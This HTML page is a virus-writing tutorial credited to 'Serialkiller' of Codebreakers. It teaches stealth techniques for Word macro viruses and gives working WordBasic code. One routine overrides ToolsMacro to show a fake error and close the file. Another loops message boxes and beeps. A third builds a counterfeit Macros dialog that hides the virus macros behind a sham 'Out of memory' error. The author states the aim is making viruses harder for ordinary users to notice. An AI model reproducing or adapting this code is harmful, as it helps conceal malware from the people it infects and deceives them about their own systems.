<html>

<head>

<title>Tutorials - Macro Virus Tutorial - Simple Stealth</title>
</head>

<body background="tuback01.gif" bgcolor="#C0C0C0" text="#000000"
link="#800000" vlink="#800000" alink="#800000">

<p align="center"><font color="#004080" size="6"><strong>Serialkiller's
Macro Virus Tutorial<br>
</strong></font><font color="#004080" size="4"><strong>- Simple
Stealth - </strong></font></p>

<hr>
<blockquote>
<pre>
  I will show you two ways to hide macros in a virus. First I will explain
 a simple routine to hide macros. However the second one is a more effective 
 way to hide a macro.

 1.  All you have to do is make a macro with the name &quot;ToolsMacro&quot;.
    Normally it will already exist in WinWord. Erase all lines and
    at the beginning type &quot;SubMain&quot; (All macros beginning with this
    command), and at the end type &quot;EndSub&quot; (All macros end with this
    command).

  Here is some example code which shows how your ToolsMacro macro could
  look like:

  SubMain
  MsgBox &quot;Illegal function in modul 0xCB15C001&quot;,32
  FileExit
  EndSub


 -&gt; SubMain                                  
   -&gt; The beginning of the macro

 -&gt; MsgBox &quot;Illegal function in modul 0xCB15C001&quot;,32
   -&gt; Display a messagebox with some fake error message.
   -&gt; Number 32 stands for the symbol which is displayed on the left
   -&gt; side of the message box, in this case it is a &quot;!&quot;

 -&gt; FileExit                              
   -&gt; Closes the current opened file

 -&gt; EndSub                                 
   -&gt; The end of this macro


   Whenever the user clicks on &quot;Tools&quot; followed by &quot;Macros&quot; the new
 ToolsMacro macro will activate, show him some error message and close
 the currently opened file.
 He will not get to see the macros (your virus). 


   Here is another, rather annoying ToolsMacro routine :)

  Sub MAIN				
  Terror:					
  MsgBox &quot;Hi&quot;, 32
  Beep						
  Goto Terror				
  End Sub




  About the symbols,
 you can change the symbols if you type another number at the end of the
 line in which you call MsgBox.

  For example:

 MsgBox&quot;Hi&quot;,32
 ... where the last part (32) represents the symbol.
     If you run the macro it will show you a message box with an &quot;!&quot; on it.


  Here are the codes for the symbols:

	16   stands for a cross red circle with &quot;OK&quot;
	17   stands for a cross red circle with &quot;OK&quot; and &quot;Cancel&quot;
	18   stands for a cross red circle with &quot;Abort&quot;,&quot;Retry&quot; and &quot;Cancel&quot;
	19   stands for a cross red circle with &quot;Yes&quot;,&quot;No&quot; and &quot;Cancel&quot;
	20   stands for a cross red circle  
	32   stands for a &quot;!&quot;
	34   stands for a &quot;?&quot; with &quot;Abort&quot;,&quot;Retry&quot; and &quot;Ignore&quot;
	37   stands for a &quot;?&quot; with &quot;Retry&quot; and &quot;Cancel&quot;
	48   stands for a &quot;!&quot; with &quot;OK&quot;
	49   stands for a &quot;!&quot; with &quot;OK&quot;,&quot;Cancel&quot;
	50   stands for a &quot;!&quot; with &quot;Abort&quot;,&quot;Retry&quot; and &quot;Ignore&quot;
	51   stands for a &quot;!&quot; with &quot;Yes&quot;,&quot;No&quot; and &quot;Cancel&quot;
	52   stands for a &quot;!&quot; with &quot;Yes&quot;,&quot;No&quot;
	53   stands for a &quot;!&quot; with &quot;Retry&quot;,&quot;Cancel&quot;
        64   stands for a &quot;I&quot; with &quot;OK&quot;   --&gt; I = &quot;Information&quot;
	66   stands for a &quot;I&quot; with &quot;Abort&quot;,&quot;Retry&quot; and &quot;Cancel&quot;
	67   stands for a &quot;I&quot; with &quot;Yes&quot;,&quot;No&quot; and &quot;Cancel&quot;
	68   stands for a &quot;I&quot; with &quot;Yes&quot;,&quot;No&quot;
	69   stands for a &quot;I&quot; with &quot;Retry&quot; and a &quot;Cancel&quot;


 2.  Here is the 2nd way to hide a macro.
     This routine is used in many viruses, like in MooNRaider, its a far more
     effective way to hide a macro. Most of the users will not notice that they
     have a macro virus on their computer.
    
     What this will do is generate a total new Tools -&gt; Macros Dialogbox,
     but one without the macros. ;-)
    

  Here is the code:

Sub MAIN
B$ = &quot;Out of memory.&quot;		;it will show at all buttons, except &quot;Cancel&quot;
C$ = &quot;WordBasic Err = 7&quot;      ;is the heading
Dim ComboBox1$(0)             ;make the macro box
ComboBox1$(0) = &quot;&quot;		;will show NOTHING in the &quot;macro Name&quot; box                      
Dim ListBox1$(0)			;make the macro contents box
ListBox1$(0) = &quot;&quot;             ;will show nothing in the macro contents box 
Dim DropListBox2$(0)		;make the list box
DropListBox2$(0) = &quot;Normal.dot(Global Template)&quot; ;the list box will show
 ;Normal.dot (Global Template)
                                        
                                        
A:
Begin Dialog UserDialog 442, 320, &quot;Macro&quot; ;make the heading from the box &quot;Macro&quot;       
 CancelButton 290, 38, 141, 21        ;make the &quot;Cancel&quot; and the &quot;Record&quot; button
 PushButton 290, 14, 141, 21, &quot;Rec&amp;ord...&quot;, .D2	    ;make the &quot;Record&quot; button
 PushButton 290, 72, 141, 21, &quot;&amp;Run&quot;, .D3    	    ;make the &quot;Run&quot; button  
 PushButton 290, 97, 141, 21, &quot;&amp;Create&quot;, .D4        ;make the &quot;Create&quot; button
 PushButton 290, 125, 141, 21, &quot;&amp;Delete&quot;, .D5       ;make the &quot;Delete&quot; button
 PushButton 290, 161, 141, 21, &quot;Or&amp;ganizer...&quot;, .D6 ;make the &quot;Organizer&quot; button
 ComboBox 7, 23, 269, 194, ComboBox1$(), .ComboBox1     
                                                        
 Text 6, 223, 93, 13, &quot;Macros &amp;Available In:&quot;, .T1     
 Text 7, 259, 109, 13, &quot;Description:&quot;, .T2	;is the heading in the last box &quot;Description&quot;             
 Text 7, 7, 93, 13, &quot;&amp;Macro Name:&quot;, .T3		;is the heading in the first box &quot;Macro Name:&quot;
 ListBox 7, 276, 425, 38, ListBox1$(), .LB1     ;list it inb the box

 DropListBox 6, 238, 425, 19, DropListBox2$(), .LB2 ;make the blank field under &quot;Macros&quot;
 
End Dialog                              		;end dialog

Redim dlg As UserDialog				                 
 x = Dialog(dlg)                        		
Select Case x                                   ;select button
 Case 0                                         ;
  Cancel                                        ;
 Case 1                                         ;                                                
  MsgBox B$, C$, 48                             ;
  Goto A                                        ;will take the user back to the box &quot;ToolsMacro&quot;
 Case 2                                         ;
  MsgBox B$, C$, 48                             ;
  Goto A                                        ; by ALL other buttons
 Case 3                                         ; you will get the error 
  MsgBox B$, C$, 48                             ; message &quot;OUT of MEMORY&quot;
  Goto A                                        ; and you will get on the 
 Case 4                                         ; &quot;ToolsMacro&quot; box again  
  MsgBox B$, C$, 48                             ;
  Goto A                                        ;
 Case 5                                         ;
  MsgBox B$, C$, 48                             ;
  Goto A                                        ;
 End Select                                     ;end select
End Sub                                         ;end of the macro



  I hope this helped you to make your viruses a bit harder to notice by the
 average user :) If you have question please feel free to write to me.
 In our next mag I will show you how polymorphism works in word macros :-)


   --Serialkiller  [Codebreakers]
     <a href="mailto:xxserialkillerxx@hotmail.com">xxserialkillerxx@hotmail.com</a></pre>
</blockquote>
<hr>
</body>
</html>
